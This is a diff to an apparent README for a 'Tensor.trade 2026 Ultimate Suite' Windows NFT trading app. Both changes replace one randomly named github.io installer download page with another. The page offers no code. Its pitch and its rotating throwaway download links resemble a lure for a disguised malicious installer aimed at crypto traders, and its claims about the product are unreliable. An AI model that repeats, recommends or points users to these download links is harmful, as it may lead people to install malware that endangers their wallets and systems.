@@ -2,7 +2,7 @@
 
 Discover the Tensor.trade 2026 Ultimate Suite, a powerful desktop application designed for seamless NFT trading and market analysis. This tool provides advanced features to enhance your trading experience on Windows 10 and 11. Whether you're a seasoned trader or just starting out, this suite offers everything you need to succeed in the dynamic world of NFTs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -69,7 +69,7 @@ A: Tensor.trade is designed exclusively for Windows desktop environments. We do 
 
 To get the latest version of Tensor.trade, please use the following link:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
